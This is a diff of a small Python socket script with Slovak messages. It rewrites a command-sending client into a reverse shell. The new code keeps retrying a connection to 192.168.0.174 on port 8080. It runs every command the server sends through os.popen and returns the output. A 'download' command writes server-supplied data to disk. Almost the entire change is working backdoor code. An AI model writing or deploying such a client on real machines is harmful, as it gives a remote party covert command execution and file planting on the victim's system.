@@ -1,38 +1,53 @@
 import socket
 import os
 
-# Nastavíme IP adresu a port servera
-server_ip = 'IP_adresa_servera'  # Nahraďte skutočnou IP adresou servera
-server_port = 8080  # Nahraďte skutočným portom servera
+def clear_screen():
+    os.system("cls" if os.name == "nt" else "clear")
 
-# Pripojíme sa na server
+def receive_file(client_socket, file_name):
+    try:
+        with open(file_name, "wb") as file:
+            while True:
+                data = client_socket.recv(1024)
+                if not data:
+                    break
+                file.write(data)
+        print("File received successfully")
+    except Exception as e:
+        print("Error receiving file:", e)
+
+server_ip = '192.168.0.174' 
+server_port = 8080  
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-try:
-    s.connect((server_ip, server_port))
-    print("Pripojenie na server úspešné. Čakám na spustenie servera...")
-except ConnectionRefusedError:
-    print("Pripojenie na server neúspešné. Uistite sa, že server je spustený.")
-    os._exit(1)
+while True:
+    try:
+        s.connect((server_ip, server_port))
+        print("Pripojenie na server úspešné. Čakám na príkazy od servera...")
+        break
+    except ConnectionRefusedError:
+        print("Pripojenie na server neúspešné. Skúšam znova...")
+        continue
 
 while True:
-    # Získať príkaz od používateľa
-    command = input("Zadajte príkaz: ")
+    command = s.recv(1024).decode()
 
-    # Poslať príkaz na server
-    s.send(command.encode())
+    if not command:
+        break
 
     if command == "exit":
         break
 
     if command == "clear":
-        os.system('clear')  # Linux príkaz na vymazanie obrazovky terminálu
+        clear_screen()
 
-    # Prijíma odpoveď od servera
-    response = s.recv(1024).decode()
-    print(response)
+    if command.startswith("download "):
+        file_name = command.split(" ")[1]
+        receive_file(s, file_name)
+    else:
+        response = os.popen(command).read()
+        s.send(response.encode())
 
 print("Disconnected.")
-
-# Zatvoríme pripojenie
 s.close()
